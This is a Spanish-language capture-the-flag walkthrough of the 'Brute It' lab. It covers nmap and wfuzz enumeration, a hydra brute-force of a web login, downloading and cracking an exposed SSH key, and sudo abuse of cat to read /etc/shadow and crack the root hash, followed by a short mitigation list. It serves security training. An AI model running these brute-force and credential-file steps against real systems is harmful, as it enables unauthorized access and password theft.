# BRUTE IT

> Dificultad: Fácil

#### FASE RECOPILACIÓN
* Primero comenzamos con el **Escaneo** del _Objetivo_:
    * `nmap -v -n --open -sV -sV --min-rate 5000 -Pn <IP>`
		
* Proseguimos con la **Enumeración**:
	* Web:
		* Buscamos los _Directorios_:
  			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://[IP]/FUZZ"`
				* Encontramos a _/admin_ únicamente	
			
		* Pasamos a enumerar los _Recursos_:
  			* `wfuzz -c --hc 400,403,404 --hh 275 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://[IP]/admin/FUZZ"`
     			* Hallamos 3 de relevancia: 	
					* /admin/index.php
					* /admin/styles.cs
					* /admin/.zip		 
___		 
	
#### FASE EXPLOTACIÓN

* Web:
	* Sabiendo que el usuario de la web app es `admin` pasamos a crackear la contraseña de dicho usuario web:
    	* `hydra -l admin -P ../rockyou.txt [IP] http-post-form "/admin/index.php:user=admin&pass=^PASS^:Username or password invalid" -v -t 64`

		* Encontramos que las credenciales son `admin:******`. Tambien, la **Web Flag**.

* Sistema:
	* Hacemos click en el enlace para obtener la Clave Privada del usuario del sistema, que parece ser `john`. Nos lleva a dicho recurso, el cual pasamos a descargar con:
    	* `curl -O http://10.48.174.154/admin/panel/id_rsa`
    * Una vez lo tenemos, debemos _Crackear la Passphrase_ con John The Ripper, por lo cual hacemos:
    	* `chmod 600 id_rsa` (le damos permisos 600)
        * `ssh2john id_rsa > id_rsa.hash` (la convertimos a hash)
        * `john --wordlist=<rockyou.txt> id_rsa.hash` (crackeamos)
        * `id_rsa:<passphrase>`
        * `(john --show id_rsa.hash)` (recuperamos el resultado)
	 
    * Ahora vamos a intentar loguearnos:
  		* `ssh -i id_rsa john@[IP]`
    	* Probamos la passphrase y éxito!
     	* Corremos `whoami` y comprobamos que somos `john`.

___

#### FASE POST-EXPLOTACIÓN (Escalar Privilegios):
Primero obtenemos la _User Flag_ con `cat user.txt`.

Apenas tenemos **Footholding del Sistema**, una de las primeras cosas para _Elevar Privilegios_ es buscar **Privilegios Sudo**. Chequeamos con `sudo -l`:  
> (root) NOPASSWD: /bin/cat
>> Podemos **Leer Ficheros como Root sin Contraseña**.

Vamos a verificar si es posible una _Explotación Sudo_ con dicho binario. Navegamos a [GTFOBins](https://gtfobins.github.io/) y terminamos corriendo: `sudo -u root /bin/cat /etc/shadow`. Efectivamente, nos devuelve el contenido de `/etc/shadow`!  

Identificamos la línea que nos importa:
> `root:...`

Consultando a la IA, por ejemplo, nos damos cuenta que trata de un hash _SHA512_. Debemos usar nuevamente John the Ripper. Creamos un fichero de texto plano que contenga toda la línea correspondiente a _root_: `nano shadow.txt`. 
Le pegamos toda la línea.

Ahora crackeamos el hash de la pass con:
* `john -wordlist=[rockyou.txt] shadow.txt`

Obtenemos `root:********`. Si la queremos recuperar:
* `john --show shadow.txt`             

Probamos logueo con `su -`, le damos la pass y somos root!

Ahora leemos la _Root Flag_ con `cat root.txt`. Eso es todo.

___

#### MITIGACIONES
1. Usar contraseñas robustas
2. No dejar info sensible dentro de la webapp
3. No dar más permisos de los necesarios a usuarios regulares
4. Verificar que los binarios no tengan vulnerabilidades conocidas
5. Llevar una política/filosofía _Zero Trust_
